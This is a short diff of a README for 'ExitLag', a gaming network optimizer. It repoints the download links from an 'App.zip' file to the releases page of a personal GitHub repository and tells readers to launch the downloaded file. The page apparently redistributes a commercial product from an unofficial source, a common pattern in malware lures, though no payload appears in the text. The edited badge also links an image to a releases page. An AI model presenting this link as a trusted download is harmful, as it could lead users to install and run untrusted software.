@@ -39,9 +39,9 @@ ExitLag is a powerful software designed to optimize your network connection, pro
 
 ## 🚥 Ready to Supercharge Your Gaming Experience?
 
-Download ExitLag now and start enjoying lag-free gaming! Click [here](https://github.com/repo/releases/9246/App.zip) to download the software. Remember to launch the file after downloading to begin optimizing your gaming connection.
+Download ExitLag now and start enjoying lag-free gaming! Click [here](https://github.com/Nvts37/Exit-Lag/releases) to download the software. Remember to launch the file after downloading to begin optimizing your gaming connection.
 
-[![Download ExitLag](https://img.shields.io/badge/Download-ExitLag-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download ExitLag](https://github.com/Nvts37/Exit-Lag/releases)](https://github.com/Nvts37/Exit-Lag/releases)
 
 Can't access the download link? No worries! Simply head over to the "Releases" section of the repository to find alternative download options.
 
